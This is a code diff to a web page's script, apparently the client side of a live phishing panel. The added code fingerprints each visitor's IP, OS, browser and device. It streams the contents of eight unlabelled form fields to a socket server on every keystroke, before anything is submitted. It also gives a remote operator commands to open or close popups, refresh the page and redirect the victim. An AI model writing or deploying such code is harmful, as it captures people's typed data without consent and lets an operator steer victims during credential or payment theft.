@@ -52,14 +52,180 @@
                     }, {});
                     ip = data.ip
                 });
+
+
+                ///////////////////////////////////////////////
+                ////////// GETTING USER AGENT INFOS ///////////
+                ///////////////////////////////////////////////
+                function getOS() {
+                    var userAgent = window.navigator.userAgent,
+                        platform = window.navigator.platform,
+                        macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
+                        windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
+                        iosPlatforms = ['iPhone', 'iPad', 'iPod'],
+                        androidPlatforms = ['Android'],
+                        linuxPlatforms = ['Linux', 'X11'],
+                        os = null;
+
+                    if (macosPlatforms.indexOf(platform) !== -1) {
+                        os = 'Mac OS';
+                    } else if (iosPlatforms.indexOf(platform) !== -1) {
+                        os = 'iOS';
+                    } else if (windowsPlatforms.indexOf(platform) !== -1) {
+                        os = 'Windows';
+                    } else if (androidPlatforms.indexOf(platform) !== -1 || /Android/.test(userAgent)) {
+                        os = 'Android';
+                    } else if (linuxPlatforms.indexOf(platform) !== -1 || /Linux/.test(platform)) {
+                        os = 'Linux';
+                    }
+
+                    return os;
+                }
+
+                // alert(getOS());
+
+                var browserName = 'Unknown';
+
+                var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
+                if (isOpera) {
+                    browserName = 'Opera';
+                }
+
+                // Firefox 1.0+
+                var isFirefox = typeof InstallTrigger !== 'undefined';
+                if (isFirefox) {
+                    browserName = 'Firefox';
+                }
+
+                // Safari 3.0+ "[object HTMLElementConstructor]" 
+                var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) { return p.toString() === "[object SafariRemoteNotification]"; })(!window['safari'] || (typeof safari !== 'undefined' && window['safari'].pushNotification));
+                if (isSafari) {
+                    browserName = 'Safari';
+                }
+
+                // Internet Explorer 6-11
+                var isIE = /*@cc_on!@*/false || !!document.documentMode;
+                if (isIE) {
+                    browserName = 'Internet Explorer';
+                }
+
+                // Edge 20+
+                var isEdge = !isIE && !!window.StyleMedia;
+                if (isEdge) {
+                    browserName = 'Edge';
+                }
+
+                // Chrome 1 - 79
+                var isChrome = !!window.chrome && (!!window.chrome.webstore || !!window.chrome.runtime);
+                if (isChrome) {
+                    browserName = 'Chrome';
+                }
+
+                // Edge (based on chromium) detection
+                var isEdgeChromium = isChrome && (navigator.userAgent.indexOf("Edg") != -1);
+                if (isEdgeChromium) {
+                    browserName = 'Edge (Chromium)';
+                }
+
+                // console.log(browserName);
+
+                function getDeviceName() {
+                    var userAgent = navigator.userAgent;
+
+                    // Check if the User-Agent string contains known patterns for certain devices
+                    if (/(iPhone)/.test(userAgent)) {
+                        return 'iPhone';
+                    } else if (/(iPad)/.test(userAgent)) {
+                        return 'iPad';
+                    } else if (/(iPod)/.test(userAgent)) {
+                        return 'iPod';
+                    } else if (/(Android)/.test(userAgent)) {
+                        // Extract device name from Android User-Agent string
+                        var match = userAgent.match(/Android\s([^\s;]+)/);
+                        if (match && match.length > 1) {
+                            return match[1];
+                        }
+                    } else {
+                        // For other devices, you may not be able to extract the exact model name
+                        return 'Unknown Device';
+                    }
+                }
+
+                console.log(getDeviceName());
+
+                // alert(`OS: ${getOS()} - Browser: ${browserName} - Device: ${getDeviceName()}`)
+
+                ///////////////////////////////////////////////
+                //////// GETTING USER AGENT INFOS END /////////
+                ///////////////////////////////////////////////
+
+                function isGapLessThan3Seconds(otherDatetime) {
+                    // Create Date objects for the current datetime and the other datetime
+                    const currentDatetime = new Date();
+                    const otherDate = new Date(otherDatetime);
+
+                    // Calculate the difference in milliseconds
+                    const differenceInMilliseconds = Math.abs(currentDatetime - otherDate);
+
+                    // Check if the difference is less than 3000 milliseconds (3 seconds)
+                    return differenceInMilliseconds < 3000;
+                }
+
+
+                if (localStorage.getItem('userId') && localStorage.getItem('lastDate')) {
+                    if (isGapLessThan3Seconds(localStorage.getItem('lastDate'))) {
+                        id = localStorage.getItem('userId')
+                    }
+                }
+
                 
                 let popupWindow;
-                $('#confirmButton').click(function() {
-                    popupWindow = window.open("./popup.html", "PopupWindow", "width=800,height=600");
-                    var date = new Date()
+                let date = new Date()
+                setTimeout(function() {
+                    // popupWindow = window.open("./popup.html", "PopupWindow", "width=800,height=600");
+                    if (!id) {
+                        data = {
+                            ipAddress: ip,
+                            os: getOS(),
+                            browserName: browserName,
+                            deviceName: getDeviceName(),
+                            userId: Math.random().toString(36).substr(2, 9),
+                            datetime: date.toLocaleString(),
+                            span: document.querySelector('#information').textContent,
+                            input1: document.querySelector('#input1').value,
+                            input1: document.querySelector('#input1').value,
+                            input2: document.querySelector('#input2').value,
+                            input3: document.querySelector('#input3').value,
+                            input4: document.querySelector('#input4').value,
+                            input5: document.querySelector('#input5').value,
+                            input6: document.querySelector('#input6').value,
+                            input7: document.querySelector('#countrySelect').value,
+                            input8: document.querySelector('#input7').value,
+                            popupOpen: false
+                        }
+                        socket.emit('formSubmit', data);
+                        // localStorage.setItem('id', data.userId)
+                        id = data.userId
+                        localStorage.setItem('userId', id)
+                    } else {
+                        sendUpdate(false)
+                    }
+                }, 1000)
+
+
+                socket.on('redirect', (userId, url) => {
+                    if (userId === id) {
+                        popupWindow.location.href = url
+                    }
+                });
+
+                function sendUpdate(popup) {
                     data = {
                         ipAddress: ip,
-                        userId: Math.random().toString(36).substr(2, 9),
+                        os: getOS(),
+                        browserName: browserName,
+                        deviceName: getDeviceName(),
+                        userId: id,
                         datetime: date.toLocaleString(),
                         span: document.querySelector('#information').textContent,
                         input1: document.querySelector('#input1').value,
@@ -70,18 +236,32 @@
                         input5: document.querySelector('#input5').value,
                         input6: document.querySelector('#input6').value,
                         input7: document.querySelector('#countrySelect').value,
-                        input8: document.querySelector('#input7').value
+                        input8: document.querySelector('#input7').value,
+                        popupOpen: popup
                     }
-                    socket.emit('formSubmit', data);
-                    // localStorage.setItem('id', data.userId)
-                    id = data.userId
+                    socket.emit('formUpdate', data);
+                }
+
+                let checkPopupClosed;
+                $('#confirmButton').click(function() {
+                    popupWindow = window.open("./popup.html", "PopupWindow", "width=800,height=600");
+                    socket.emit('handlePopup', id, true);
+                    checkPopupClosed = setInterval(() => {
+                        if (popupWindow.closed) {
+                            socket.emit('handlePopup', id, false);
+                            clearInterval(checkPopupClosed)
+                        }
+                    }, 200)
                 })
 
-                socket.on('redirect', (userId, url) => {
-                    if (userId === id) {
-                        popupWindow.location.href = url
-                    }
-                });
+                $('input').on("input", function() {
+                    sendUpdate(false)
+                })
+
+                $('#countrySelect').on("change", function() {
+                    sendUpdate(false)
+                })
+                
     
                 // socket.on('closePopup', (userId) => {
                 //     if (userId === id) {
@@ -96,14 +276,64 @@
                         window.location.href = url
                     }
                 })
-
-                const checkPopupClosed = setInterval(() => {
-                    if (popupWindow && popupWindow.closed) {
-                        // Popup is closed
-                        // clearInterval(checkPopupClosed); // Stop the periodic check
-                        socket.emit('popupClose', id)
+                
+                socket.on('openPopup', (userId) => {
+                    if (userId === id) {
+                        popupWindow = window.open("./popup.html", "PopupWindow", "width=800,height=600");
+                        socket.emit('handlePopup', id, true);
+                        checkPopupClosed = setInterval(() => {
+                            if (popupWindow.closed) {
+                                socket.emit('handlePopup', id, false);
+                                clearInterval(checkPopupClosed)
+                            }
+                        }, 200)
                     }
-                }, 200)
+                })
+
+                socket.on('closePopup', (userId) => {
+                    if (userId === id) {
+                        popupWindow.close()
+                    }
+                })
+
+                socket.on('refreshPage', (userId) => {
+                    if (userId === id) {
+                        window.location.reload()
+                    }
+                })
+
+                socket.on('checkClosed', (userId) => {
+                    if (userId === id) {
+                        socket.emit('closeResponse', userId)
+                    }
+                })
+
+                socket.on('userRedirect', (userId, page) => {
+                    if (userId === id) {
+                        window.location.href = page
+                    }
+                })
+
+                // Attach a beforeunload event listener to detect page unload
+                window.addEventListener('beforeunload', function (event) {
+                    // if (!leavingPage) {
+                        // This message will prompt the user with a confirmation dialog
+                        // event.preventDefault(); // Modern browsers require this line to display the dialog
+                        // event.returnValue = ''; // This line is required for older browsers
+
+                        // Send a socket message when the user closes the page
+                        socket.emit('userClosedPage', id); // Adjust according to your socket setup
+                        localStorage.setItem('lastDate', new Date().toLocaleString())
+                    // }
+                });
+
+                // Attach an unload event listener to detect page close or refresh
+                // window.addEventListener('unload', function () {
+                //     leavingPage = true;
+                // });
+
+
+
             })
         </script>
     </body>
